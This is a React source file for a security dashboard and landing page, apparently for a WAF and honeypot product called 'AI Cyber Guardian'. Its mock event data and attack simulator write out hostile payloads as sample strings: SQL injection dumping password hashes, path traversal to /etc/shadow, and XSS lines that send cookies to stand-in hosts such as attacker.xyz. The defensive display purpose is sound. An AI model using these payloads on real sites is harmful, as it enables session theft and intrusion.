import { useState, useEffect, useMemo, useCallback } from "react";
import {
  LineChart,
  Line,
  BarChart,
  Bar,
  XAxis,
  YAxis,
  Tooltip,
  ResponsiveContainer,
  Cell,
  PieChart,
  Pie,
} from "recharts";
import {
  checkBackendHealth,
  fetchLiveEvents,
  fetchMLStatus,
  blockIP as apiBlockIP,
  unblockIP as apiUnblockIP,
} from "../services/guardianApi";
import { useThreatStream, playAlertChime } from "../hooks/useThreatStream";
import EmotionSoundViz from "./EmotionSoundViz";
import EmotionSettingsModal from "./EmotionSettingsModal";
import EmotionGridOverlay from "./EmotionGridOverlay";
import EmotionPreloader from "./EmotionPreloader";
import EmotionAIAssistant from "./EmotionAIAssistant";
import KineticButton from "./KineticButton";
import RealtimeGeoThreatMap from "./RealtimeGeoThreatMap";
import AdminDashboard from "./AdminDashboard";
import cyberpunkBg from "../assets/cyberpunk_bg.jpg";
import {
  playClickSound,
  playHoverSound,
  playThreatAlarm,
  isSoundEnabled as getSoundState,
  setSoundEnabled as applySoundState,
} from "../utils/soundEngine";

// ── Emotion Agency Design Tokens ───────────────────────────────────────────
const T = {
  bg:       "#0b0816",
  surface:  "#140e26",
  surface2: "#1d1436",
  border:   "#2c1d4d",
  text:     "#f5efff",
  muted:    "#8e80ab",
  low:      "#319f43",
  lowBg:    "#0c2b12",
  medium:   "#f59e0b",
  medBg:    "#2e1d05",
  high:     "#ff7a00",
  highBg:   "#381800",
  critical: "#ff3b30",
  critBg:   "#380808",
  blue:     "#00e5ff",
  blueBg:   "#082035",
  purple:   "#9047ff",
  purpleBg: "#251245",
  green:    "#319f43",
};

const sevColor = { LOW: T.low, MEDIUM: T.medium, HIGH: T.high, CRITICAL: T.critical };
const sevBg    = { LOW: T.lowBg, MEDIUM: T.medBg, HIGH: T.highBg, CRITICAL: T.critBg };
const sevDot   = { LOW: "●", MEDIUM: "●", HIGH: "●", CRITICAL: "◉" };

// ── Initial Mock Data ──────────────────────────────────────────────────────
const ATTACKS = ["SQLi", "XSS", "BruteForce", "PathTraversal", "Scanner"];
const COUNTRIES = [
  { name: "China", flag: "🇨🇳", city: "Beijing", isp: "China Telecom" },
  { name: "Russia", flag: "🇷🇺", city: "Moscow", isp: "Selectel Ltd" },
  { name: "Brazil", flag: "🇧🇷", city: "São Paulo", isp: "Locaweb" },
  { name: "Germany", flag: "🇩🇪", city: "Frankfurt", isp: "DFZ64 Europe Tor" },
  { name: "India", flag: "🇮🇳", city: "Mumbai", isp: "Jio Platforms" },
  { name: "USA", flag: "🇺🇸", city: "Ashburn", isp: "Amazon AWS" },
];
const IPS = [
  "192.168.1.100",
  "45.33.32.220",
  "103.21.244.1",
  "185.220.101.34",
  "91.108.4.0",
  "198.51.100.5",
];

function randItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randInt(a, b) { return Math.floor(Math.random() * (b - a + 1)) + a; }

function genScore(type) {
  if (type === "SQLi") return randInt(75, 98);
  if (type === "XSS") return randInt(58, 85);
  if (type === "BruteForce") return randInt(62, 92);
  if (type === "PathTraversal") return randInt(54, 80);
  return randInt(30, 52);
}

function scoreLevel(s) {
  return s >= 85 ? "CRITICAL" : s >= 60 ? "HIGH" : s >= 30 ? "MEDIUM" : "LOW";
}

function genEvent() {
  const type = randItem(ATTACKS);
  const score = genScore(type);
  const countryObj = randItem(COUNTRIES);
  const endpoints = ["/login", "/admin", "/api/users", "/db", "/upload", "/search", "/.env", "/actuator/env"];
  const methods = ["POST", "GET", "POST", "PUT"];
  const payloads = {
    SQLi: "' UNION SELECT username, password_hash FROM admin_users--",
    XSS: "<script>fetch('//attacker.xyz/c?'+document.cookie)</script>",
    BruteForce: "admin:SuperSecret2026! [attempt #14]",
    PathTraversal: "../../../../etc/shadow",
    Scanner: "GET /wp-content/plugins/revslider/temp/update_extract/run.php",
  };

  return {
    id: Date.now() + Math.random(),
    ip: randItem(IPS),
    country: `${countryObj.flag} ${countryObj.name}`,
    countryName: countryObj.name,
    city: countryObj.city,
    isp: countryObj.isp,
    type,
    score,
    level: scoreLevel(score),
    time: new Date().toLocaleTimeString("en-GB", { hour12: false }),
    path: randItem(endpoints),
    method: randItem(methods),
    payload: payloads[type] || "Host scanner probe",
    status: score >= 85 ? "Trapped in Honeypot" : score >= 60 ? "Blocked by WAF" : "Monitored",
  };
}

const INITIAL_EVENTS = Array.from({ length: 16 }, (_, i) => {
  const e = genEvent();
  e.time = new Date(Date.now() - (15 - i) * 12000).toLocaleTimeString("en-GB", { hour12: false });
  return e;
});

const TIMELINE_DATA = [
  { hour: "00:00", LOW: 3, MEDIUM: 2, HIGH: 1, CRITICAL: 0 },
  { hour: "03:00", LOW: 5, MEDIUM: 4, HIGH: 2, CRITICAL: 1 },
  { hour: "06:00", LOW: 8, MEDIUM: 5, HIGH: 3, CRITICAL: 1 },
  { hour: "09:00", LOW: 14, MEDIUM: 9, HIGH: 6, CRITICAL: 3 },
  { hour: "12:00", LOW: 18, MEDIUM: 12, HIGH: 8, CRITICAL: 4 },
  { hour: "15:00", LOW: 15, MEDIUM: 10, HIGH: 7, CRITICAL: 2 },
  { hour: "18:00", LOW: 12, MEDIUM: 8, HIGH: 5, CRITICAL: 2 },
  { hour: "21:00", LOW: 7, MEDIUM: 4, HIGH: 3, CRITICAL: 1 },
];

const PIE_DATA = [
  { name: "SQLi", value: 42, color: "#F85149" },
  { name: "XSS", value: 28, color: "#F0883E" },
  { name: "BruteForce", value: 18, color: "#E3B341" },
  { name: "Scanner", value: 12, color: "#58A6FF" },
];

const INITIAL_ATTACKERS = [
  {
    ip: "192.168.1.100",
    country: "China",
    flag: "🇨🇳",
    city: "Beijing",
    isp: "China Telecom",
    ua: "sqlmap/1.7.8#dev (https://sqlmap.org)",
    lang: "zh-CN,zh;q=0.9",
    tools: ["sqlmap", "nikto"],
    first: "2026-06-01 09:14",
    last: "10:31",
    total: 47,
    sessions: 3,
    level: "CRITICAL",
  },
  {
    ip: "45.33.32.220",
    country: "Russia",
    flag: "🇷🇺",
    city: "Moscow",
    isp: "Selectel Ltd",
    ua: "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    lang: "ru-RU,ru;q=0.8",
    tools: ["nikto", "nmap"],
    first: "2026-06-02 11:20",
    last: "09:58",
    total: 31,
    sessions: 2,
    level: "HIGH",
  },
  {
    ip: "103.21.244.1",
    country: "Brazil",
    flag: "🇧🇷",
    city: "São Paulo",
    isp: "Locaweb",
    ua: "BurpSuite/2026.4.1 Professional",
    lang: "pt-BR,pt;q=0.9",
    tools: ["burpsuite"],
    first: "2026-06-03 14:02",
    last: "22:10",
    total: 28,
    sessions: 1,
    level: "HIGH",
  },
  {
    ip: "185.220.101.34",
    country: "Germany",
    flag: "🇩🇪",
    city: "Frankfurt",
    isp: "M247 Europe SRL (Tor Exit)",
    ua: "Hydra v9.5-dev network logon cracker",
    lang: "de-DE,de;q=0.7",
    tools: ["hydra"],
    first: "2026-06-04 18:33",
    last: "04:02",
    total: 19,
    sessions: 0,
    level: "MEDIUM",
  },
  {
    ip: "91.108.4.0",
    country: "India",
    flag: "🇮🇳",
    city: "Mumbai",
    isp: "Jio Platforms",
    ua: "DirBuster-1.0-RC1 (http://www.owasp.org/)",
    lang: "en-IN,hi;q=0.8",
    tools: ["dirbuster"],
    first: "2026-06-05 06:10",
    last: "06:15",
    total: 14,
    sessions: 0,
    level: "MEDIUM",
  },
  {
    ip: "198.51.100.5",
    country: "USA",
    flag: "🇺🇸",
    city: "Ashburn",
    isp: "Amazon AWS",
    ua: "python-requests/2.31.0",
    lang: "en-US,en;q=0.5",
    tools: ["sqlmap"],
    first: "2026-06-05 01:00",
    last: "01:20",
    total: 9,
    sessions: 0,
    level: "LOW",
  },
];

const INITIAL_BLOCKED = [
  {
    ip: "192.168.1.100",
    reason: "SQLi — Rule R1 + R6 (score 92)",
    blockedAt: "2026-06-07 10:31",
    expires: "Permanent",
    permanent: true,
  },
  {
    ip: "45.33.32.220",
    reason: "Scanner detected — Rule R6 (score 87)",
    blockedAt: "2026-06-07 10:20",
    expires: "2026-06-14 10:20",
    permanent: false,
  },
  {
    ip: "185.220.101.34",
    reason: "Brute force — Rule R4 (score 78)",
    blockedAt: "2026-06-06 22:05",
    expires: "2026-06-13 22:05",
    permanent: false,
  },
  {
    ip: "8.8.8.1",
    reason: "Path traversal — Rule R5 (score 69)",
    blockedAt: "2026-06-05 16:40",
    expires: "2026-06-12 16:40",
    permanent: false,
  },
];

const INITIAL_HONEYPOT_SESSIONS = [
  {
    id: "hp-901",
    ip: "192.168.1.100",
    country: "🇨🇳 China",
    started: "10:31:02",
    duration: "4m 12s",
    requestsCount: 38,
    live: true,
    actions: [
      { time: "10:31:02", method: "GET", endpoint: "/admin", tool: "sqlmap" },
      { time: "10:31:05", method: "GET", endpoint: "/admin/users", tool: "sqlmap" },
      { time: "10:31:09", method: "POST", endpoint: "/admin/db", tool: "sqlmap" },
      { time: "10:31:14", method: "GET", endpoint: "/admin/export", tool: "sqlmap" },
      { time: "10:31:22", method: "POST", endpoint: "/api/v1/auth/token", tool: "sqlmap" },
    ],
  },
  {
    id: "hp-902",
    ip: "45.33.32.220",
    country: "🇷🇺 Russia",
    started: "10:28:44",
    duration: "1m 08s",
    requestsCount: 14,
    live: true,
    actions: [
      { time: "10:28:44", method: "GET", endpoint: "/.env", tool: "nikto" },
      { time: "10:28:50", method: "GET", endpoint: "/wp-login.php", tool: "nikto" },
      { time: "10:29:12", method: "GET", endpoint: "/actuator/env", tool: "nmap" },
    ],
  },
  {
    id: "hp-903",
    ip: "103.21.244.1",
    country: "🇧🇷 Brazil",
    started: "09:54:10",
    duration: "0m 44s",
    requestsCount: 7,
    live: false,
    actions: [
      { time: "09:54:10", method: "POST", endpoint: "/api/comments", tool: "burpsuite" },
      { time: "09:54:22", method: "GET", endpoint: "/search?q=<script>", tool: "burpsuite" },
    ],
  },
  {
    id: "hp-904",
    ip: "198.51.100.5",
    country: "🇺🇸 USA",
    started: "08:12:30",
    duration: "2m 51s",
    requestsCount: 21,
    live: false,
    actions: [
      { time: "08:12:30", method: "GET", endpoint: "/login", tool: "python-requests" },
      { time: "08:12:45", method: "POST", endpoint: "/login", tool: "python-requests" },
    ],
  },
];

const INITIAL_SITES = [
  {
    name: "Fashion E-Store",
    url: "https://shop.trend.in",
    key: "gk_live_589041a998b",
    status: "Active",
    created: "2026-05-12",
    checks: "42,180",
  },
  {
    name: "Fintech Core API",
    url: "https://api.fintech.app",
    key: "gk_live_920114f003e",
    status: "Active",
    created: "2026-05-20",
    checks: "118,902",
  },
  {
    name: "Dev Blog",
    url: "https://blog.devstudio.io",
    key: "gk_live_382179a512c",
    status: "Paused",
    created: "2026-06-01",
    checks: "3,221",
  },
  {
    name: "Student Portal",
    url: "https://portal.eduhub.org",
    key: "gk_live_441022e891d",
    status: "Active",
    created: "2026-06-05",
    checks: "890",
  },
];

// ── Reusable UI Elements ───────────────────────────────────────────────────
function Badge({ level, small }) {
  const col = sevColor[level] || T.blue;
  const bg = sevBg[level] || T.blueBg;
  const dot = sevDot[level] || "●";
  return (
    <span
      style={{
        display: "inline-flex",
        alignItems: "center",
        gap: 4,
        padding: small ? "2px 6px" : "3px 10px",
        borderRadius: 4,
        background: bg,
        border: `1px solid ${col}`,
        color: col,
        fontSize: small ? 10 : 11,
        fontWeight: 600,
        letterSpacing: "0.04em",
      }}
    >
      <span style={{ fontSize: small ? 8 : 10 }}>{dot}</span>
      {level}
    </span>
  );
}

function ScoreBar({ score, compact }) {
  const color = score >= 85 ? T.critical : score >= 60 ? T.high : score >= 30 ? T.medium : T.low;
  return (
    <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
      <div
        style={{
          flex: 1,
          height: compact ? 4 : 6,
          background: T.surface2,
          borderRadius: 3,
          overflow: "hidden",
          minWidth: compact ? 40 : 60,
        }}
      >
        <div
          style={{
            width: `${score}%`,
            height: "100%",
            background: color,
            borderRadius: 3,
            transition: "width 0.4s ease",
            boxShadow: score >= 85 ? `0 0 6px ${color}40` : "none",
          }}
        />
      </div>
      <span
        style={{
          color,
          fontWeight: 700,
          fontSize: compact ? 11 : 13,
          minWidth: compact ? 22 : 28,
          fontFamily: "monospace",
        }}
      >
        {score}
      </span>
    </div>
  );
}

function Card({ children, style, glow }) {
  return (
    <div
      style={{
        background: T.surface,
        border: `1px solid ${glow ? T.critical + "60" : T.border}`,
        borderRadius: 8,
        padding: "16px",
        overflow: "hidden",
        boxShadow: glow ? `0 0 20px ${T.critical}15` : "none",
        ...style,
      }}
    >
      {children}
    </div>
  );
}

function PanelTitle({ icon, title, right }) {
  return (
    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 12 }}>
      <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
        <span style={{ fontSize: 13 }}>{icon}</span>
        <span style={{ color: T.text, fontWeight: 600, fontSize: 13, letterSpacing: "0.03em" }}>{title}</span>
      </div>
      {right && <span style={{ color: T.muted, fontSize: 11 }}>{right}</span>}
    </div>
  );
}

function StatCard({ icon, label, value, sub, color }) {
  color = color || T.blue;
  return (
    <Card style={{ flex: 1, minWidth: 0 }}>
      <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between" }}>
        <div>
          <div
            style={{
              color: T.muted,
              fontSize: 11,
              fontWeight: 500,
              letterSpacing: "0.05em",
              textTransform: "uppercase",
              marginBottom: 6,
            }}
          >
            {label}
          </div>
          <div style={{ color, fontSize: 30, fontWeight: 700, lineHeight: 1, fontFamily: "monospace" }}>{value}</div>
          <div style={{ color: T.muted, fontSize: 11, marginTop: 5 }}>{sub}</div>
        </div>
        <span style={{ fontSize: 20, opacity: 0.6 }}>{icon}</span>
      </div>
    </Card>
  );
}

function Btn({ children, primary, danger, small, onClick, style, disabled }) {
  const bg = primary ? T.blue : danger ? T.critical : T.surface2;
  const col = primary || danger ? "#0D1117" : T.blue;
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      style={{
        padding: small ? "4px 10px" : "7px 14px",
        background: disabled ? T.surface : bg,
        color: disabled ? T.muted : col,
        border: `1px solid ${primary ? T.blue : danger ? T.critical : T.border}`,
        borderRadius: 5,
        fontSize: small ? 11 : 12,
        fontWeight: 600,
        cursor: disabled ? "not-allowed" : "pointer",
        fontFamily: "inherit",
        transition: "all 0.15s",
        display: "inline-flex",
        alignItems: "center",
        justifyContent: "center",
        gap: 6,
        ...style,
      }}
    >
      {children}
    </button>
  );
}

function Modal({ title, isOpen, onClose, children, width = 500 }) {
  if (!isOpen) return null;
  return (
    <div
      style={{
        position: "fixed",
        inset: 0,
        zIndex: 10000,
        background: "rgba(0,0,0,0.75)",
        backdropFilter: "blur(6px)",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        padding: 20,
      }}
      onClick={onClose}
    >
      <div
        style={{
          width: "100%",
          maxWidth: width,
          background: T.surface,
          border: `1px solid ${T.border}`,
          borderRadius: 8,
          boxShadow: "0 10px 40px rgba(0,0,0,0.8)",
          overflow: "hidden",
        }}
        onClick={(e) => e.stopPropagation()}
      >
        <div
          style={{
            padding: "12px 18px",
            borderBottom: `1px solid ${T.border}`,
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            background: T.surface2,
          }}
        >
          <div style={{ fontWeight: 600, fontSize: 14, color: T.text }}>{title}</div>
          <button
            onClick={onClose}
            style={{
              background: "transparent",
              border: "none",
              color: T.muted,
              fontSize: 18,
              cursor: "pointer",
            }}
          >
            ✕
          </button>
        </div>
        <div style={{ padding: 20, maxHeight: "80vh", overflowY: "auto" }}>{children}</div>
      </div>
    </div>
  );
}

// ── Screen: Landing ────────────────────────────────────────────────────────
// ── Screen: Landing (Elevated Cyberpunk Aesthetic) ──────────────────────────
function Landing({ onNav }) {
  const [activeTab, setActiveTab] = useState("fastapi");
  const [copied, setCopied] = useState(false);
  const [openFaq, setOpenFaq] = useState(null);

  // ── Live Attack Simulator State ──
  const [simulatorPayload, setSimulatorPayload] = useState("sqli");
  const [isSimulating, setIsSimulating] = useState(false);
  const [simStep, setSimStep] = useState(0); // 0 = idle, 1 = extract, 2 = evaluate, 3 = verdict
  const [simResult, setSimResult] = useState({
    verdict: "HONEYPOT_DIVERT",
    score: 96,
    category: "SQL Injection (CWE-89)",
    entropy: 4.88,
    latency: "1.84 ms",
    mitre: "T1190 - Exploit Public-Facing App",
    decoyPayload: "CANARY_AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
  });

  const attackPresets = {
    sqli: {
      id: "sqli",
      badge: "CRITICAL EXPLOIT",
      badgeColor: "#ef4444",
      name: "SQL Injection",
      payload: "' UNION SELECT 1, table_name, column_name FROM information_schema.columns --",
      score: 96,
      category: "SQL Injection (CWE-89)",
      entropy: 4.88,
      latency: "1.84 ms",
      mitre: "T1190 - Exploit Public-Facing App",
      verdict: "HONEYPOT_DIVERT",
      actionDesc: "Silently diverted into RAM POSIX VFS. Decoy schema & canary DB credentials delivered to attacker.",
      decoyPayload: "CANARY_AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    },
    xss: {
      id: "xss",
      badge: "HIGH THREAT",
      badgeColor: "#ffaa00",
      name: "Stored / Reflected XSS",
      payload: "<script>fetch('https://c2.darknet.io/log?cookie='+document.cookie)</script>",
      score: 91,
      category: "Cross-Site Scripting (CWE-79)",
      entropy: 4.62,
      latency: "1.65 ms",
      mitre: "T1059.007 - JavaScript Execution",
      verdict: "HONEYPOT_DIVERT",
      actionDesc: "Isolated session. Script neutralized in virtual browser context with canary cookie telemetry.",
      decoyPayload: "SESSION_TOKEN=CANARY_JWT_e30.eyJ1c2VyIjoiaGFja2VyIn0.dummySignature"
    },
    traversal: {
      id: "traversal",
      badge: "HIGH THREAT",
      badgeColor: "#a855f7",
      name: "Path Traversal & LFI",
      payload: "../../../../../etc/passwd%00/var/log/nginx/access.log",
      score: 93,
      category: "Path Traversal (CWE-22)",
      entropy: 4.35,
      latency: "2.10 ms",
      mitre: "T1083 - File & Directory Discovery",
      verdict: "HONEYPOT_DIVERT",
      actionDesc: "Decoy /etc/passwd rendered from in-memory dictionary. Zero access to host kernel filesystem.",
      decoyPayload: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:canary:/usr/sbin:/bin/false"
    },
    clean: {
      id: "clean",
      badge: "LEGITIMATE TRAFFIC",
      badgeColor: "#22c55e",
      name: "Clean API Request",
      payload: "GET /api/v2/orders/receipt?order_id=ORD-99214&format=json HTTP/1.1",
      score: 6,
      category: "Nominal API Ingress",
      entropy: 2.15,
      latency: "0.82 ms",
      mitre: "N/A - Whitelisted Profile",
      verdict: "ALLOW_TO_ORIGIN",
      actionDesc: "Clean structural signature. Dual-tree inference confidence: 99.8% benign. Zero delay to backend.",
      decoyPayload: "HTTP/1.1 200 OK Content-Type: application/json (Routed to upstream service)"
    }
  };

  function triggerSimulation(key) {
    playClickSound();
    setSimulatorPayload(key);
    setIsSimulating(true);
    setSimStep(1);

    setTimeout(() => {
      setSimStep(2);
    }, 450);

    setTimeout(() => {
      setSimStep(3);
      setSimResult(attackPresets[key]);
      setIsSimulating(false);
      if (attackPresets[key].score > 80) {
        playThreatAlarm();
      }
    }, 900);
  }

  function copyCode(text) {
    playClickSound();
    navigator.clipboard?.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  const features = [
    {
      icon: (
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"></path>
        </svg>
      ),
      title: "Dual-Tree Machine Learning Pipeline",
      desc: "Combines Isolation Forest anomaly discovery with depth-bounded Random Forest classification to catch 0-days while keeping latency under 2.5ms.",
      color: "#38bdf8",
      accent: "rgba(56, 189, 248, 0.08)"
    },
    {
      icon: (
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <polygon points="12 2 2 7 12 12 22 7 12 2"></polygon>
          <polyline points="2 17 12 22 22 17"></polyline>
          <polyline points="2 12 12 17 22 12"></polyline>
        </svg>
      ),
      title: "Zero-Escape In-Memory Honeypot",
      desc: "CRITICAL exploits are silently diverted into an in-memory POSIX mock filesystem. Attackers explore dummy targets with zero kernel escape risk.",
      color: "#38bdf8",
      accent: "rgba(56, 189, 248, 0.08)"
    },
    {
      icon: (
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
          <line x1="8" y1="21" x2="16" y2="21"></line>
          <line x1="12" y1="17" x2="12" y2="21"></line>
        </svg>
      ),
      title: "Autonomous SOC Control Dashboard",
      desc: "Real-time threat feed, global vector attack distribution, adversary profiling, and autonomous IP quarantine with one-click unban.",
      color: "#38bdf8",
      accent: "rgba(56, 189, 248, 0.08)"
    },
    {
      icon: (
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
        </svg>
      ),
      title: "STIX 2.1 Threat Intelligence Export",
      desc: "Trapped sessions, reconnaissance signatures, and attacker IPs automatically conform to OASIS STIX 2.1 for Splunk, Sentinel, and Datadog SIEMs.",
      color: "#38bdf8",
      accent: "rgba(56, 189, 248, 0.08)"
    },
    {
      icon: (
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
          <circle cx="8.5" cy="7.5" r="4"></circle>
          <polyline points="17 11 19 13 23 9"></polyline>
        </svg>
      ),
      title: "Super Admin Platform Guard",
      desc: "Centralized multi-tenant provisioning, cross-tenant CIDR blocking, automated circuit breakers (FAIL_OPEN), and platform-wide audit logs.",
      color: "#38bdf8",
      accent: "rgba(56, 189, 248, 0.08)"
    }
  ];

const metrics = [
    { val: "94.04%", label: "OVERALL ACCURACY", sub: "CSIC 2010 Test Split (4,800)", color: "#ffffff" },
    { val: "96.24%", label: "MODEL PRECISION", sub: "Attack Verification Accuracy", color: "#ffffff" },
    { val: "91.67%", label: "EXPLOIT RECALL", sub: "Actual Attacks Intercepted", color: "#ffffff" },
    { val: "3.58%", label: "FALSE POSITIVE RATE", sub: "Industry Standard <= 5% (Passed)", color: "#38bdf8" },
    { val: "0.939", label: "F1-SCORE BENCHMARK", sub: "Harmonic Mean (Precision/Recall)", color: "#ffffff" },
  ];

  const faqs = [
    {
      q: "How does the In-Memory Linux Honeypot eliminate container escape risks?",
      a: "Unlike legacy honeypots that launch Docker containers or lightweight micro-VMs (which remain susceptible to kernel privilege escalation and 0-day container escape CVEs), Cyber Guardian's deception subsystem runs strictly in Python memory. It simulates standard POSIX tree operations (/etc, /var/log, /proc) using in-memory dictionary abstractions. Attackers never touch host system calls or Linux kernel structures."
    },
    {
      q: "Does running dual machine learning models slow down high-traffic payment APIs?",
      a: "No. The entire Dual-Tree inference pipeline (Isolation Forest + Depth-bounded Random Forest) is vectorized using optimized NumPy matrix operations and pre-compiled n-gram hashing. Total evaluation latency averages 2.41 milliseconds per payload on ordinary cloud CPUs—well within strict 5.0ms enterprise latency SLAs."
    },
    {
      q: "What happens if a severe traffic spike causes inference timeout?",
      a: "Cyber Guardian incorporates an autonomous FAIL-OPEN circuit breaker pattern. If inference ever exceeds the 5.0ms threshold or system degradation is detected, requests bypass the AI pipeline and route straight to your origin, guaranteeing zero transactional disruption."
    },
    {
      q: "Can Cyber Guardian export threat telemetry into Splunk, Datadog, or Microsoft Sentinel?",
      a: "Yes. All trapped sessions, reconnaissance commands, and adversary IP indicators are formatted according to the international OASIS STIX 2.1 standard and mapped directly to MITRE ATT&CK technique IDs (such as T1190, T1059, T1083). Telemetry feeds can be consumed via REST, Webhooks, or Syslog."
    }
  ];

  return (
    <div
      style={{
        color: "#ffffff",
        minHeight: "100vh",
        position: "relative",
        backgroundColor: "#070a14",
        overflowX: "hidden",
        fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, sans-serif",
      }}
    >

      {/* ── Top Floating Clean Navbar ── */}
      <nav
        style={{
          position: "sticky",
          top: 14,
          zIndex: 100,
          maxWidth: 1220,
          margin: "0 auto",
          padding: "10px 24px",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          borderRadius: 16,
          backdropFilter: "blur(16px)",
          WebkitBackdropFilter: "blur(16px)",
          background: "rgba(11, 15, 25, 0.88)",
          border: "1px solid rgba(255, 255, 255, 0.08)",
          boxShadow: "0 8px 24px rgba(0, 0, 0, 0.4)",
        }}
      >
        <div
          style={{ display: "flex", alignItems: "center", gap: 12, cursor: "pointer" }}
          onClick={() => {
            playClickSound();
            window.scrollTo({ top: 0, behavior: "smooth" });
          }}
        >
          <div
            style={{
              width: 34,
              height: 34,
              borderRadius: 10,
              background: "rgba(255, 255, 255, 0.06)",
              border: "1px solid rgba(255, 255, 255, 0.12)",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            <span style={{ fontSize: 16 }}>🛡️</span>
          </div>
          <div>
            <div
              style={{
                fontFamily: "'Inter', -apple-system, sans-serif",
                fontWeight: 700,
                fontSize: 14,
                letterSpacing: "0.5px",
                color: "#ffffff",
              }}
            >
              AI CYBER GUARDIAN
            </div>
            <div style={{ fontSize: 10, color: "#94a3b8", fontFamily: "'Inter', sans-serif" }}>
              Enterprise Deception Shield
            </div>
          </div>
        </div>

        {/* Center Nav Links */}
        <div style={{ display: "flex", alignItems: "center", gap: 24 }}>
          {[
            { label: "Simulator", href: "#simulator" },
            { label: "Features", href: "#features" },
            { label: "Architecture", href: "#architecture" },
            { label: "SLA Metrics", href: "#metrics" },
            { label: "FAQ", href: "#faq" },
          ].map((item) => (
            <a
              key={item.label}
              href={item.href}
              onClick={() => playClickSound()}
              style={{
                color: "#94a3b8",
                fontSize: 13,
                fontWeight: 500,
                textDecoration: "none",
                fontFamily: "'Inter', sans-serif",
                transition: "color 0.15s",
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.color = "#ffffff";
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.color = "#94a3b8";
              }}
            >
              {item.label}
            </a>
          ))}
        </div>

        {/* Right Action Buttons */}
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <button
            onClick={() => {
              playClickSound();
              onNav("login");
            }}
            style={{
              padding: "8px 16px",
              borderRadius: 8,
              background: "rgba(255, 255, 255, 0.05)",
              border: "1px solid rgba(255, 255, 255, 0.12)",
              color: "#e2e8f0",
              fontSize: 12,
              fontWeight: 600,
              cursor: "pointer",
              fontFamily: "'Inter', sans-serif",
              transition: "all 0.15s",
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.background = "rgba(255, 255, 255, 0.1)";
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.background = "rgba(255, 255, 255, 0.05)";
            }}
          >
            Portal Login
          </button>
          <button
            onClick={() => {
              playClickSound();
              onNav("dashboard");
            }}
            style={{
              padding: "8px 18px",
              borderRadius: 8,
              background: "#2563eb",
              border: "none",
              color: "#ffffff",
              fontSize: 12,
              fontWeight: 600,
              cursor: "pointer",
              fontFamily: "'Inter', sans-serif",
              boxShadow: "0 2px 8px rgba(37, 99, 235, 0.3)",
              transition: "all 0.15s",
            }}
            onMouseEnter={(e) => (e.currentTarget.style.background = "#1d4ed8")}
            onMouseLeave={(e) => (e.currentTarget.style.background = "#2563eb")}
          >
            Enter SOC →
          </button>
        </div>
      </nav>

      {/* ── Hero Section ── */}
      <div
        style={{
          position: "relative",
          zIndex: 2,
          maxWidth: 1160,
          margin: "0 auto",
          padding: "60px 24px 30px",
          textAlign: "center",
        }}
      >
        {/* Clean Minimal Badge */}
        <div
          style={{
            display: "inline-flex",
            alignItems: "center",
            gap: 8,
            padding: "6px 14px",
            borderRadius: 20,
            background: "rgba(255, 255, 255, 0.04)",
            border: "1px solid rgba(255, 255, 255, 0.1)",
            marginBottom: 24,
          }}
        >
          <span
            style={{
              width: 7,
              height: 7,
              borderRadius: "50%",
              background: "#38bdf8",
              display: "inline-block",
            }}
          />
          <span
            style={{
              fontSize: 12,
              fontFamily: "'Inter', sans-serif",
              fontWeight: 600,
              color: "#cbd5e1",
              letterSpacing: "0.5px",
            }}
          >
            Autonomous Threat Fusion · In-Memory Deception
          </span>
        </div>

        {/* Clean Hero Title */}
        <h1
          style={{
            fontSize: "clamp(34px, 4.8vw, 56px)",
            fontWeight: 800,
            lineHeight: 1.18,
            letterSpacing: "-0.5px",
            margin: "0 auto 20px",
            maxWidth: 950,
            fontFamily: "'Inter', -apple-system, sans-serif",
            color: "#ffffff",
          }}
        >
          Stop Application Attacks.
          <br />
          <span style={{ color: "#94a3b8" }}>
            Trap Adversaries In-Memory.
          </span>
        </h1>

        <p
          style={{
            fontSize: "clamp(15px, 1.6vw, 17px)",
            color: "#94a3b8",
            maxWidth: 720,
            margin: "0 auto 32px",
            lineHeight: 1.65,
            fontWeight: 400,
            fontFamily: "'Inter', sans-serif",
          }}
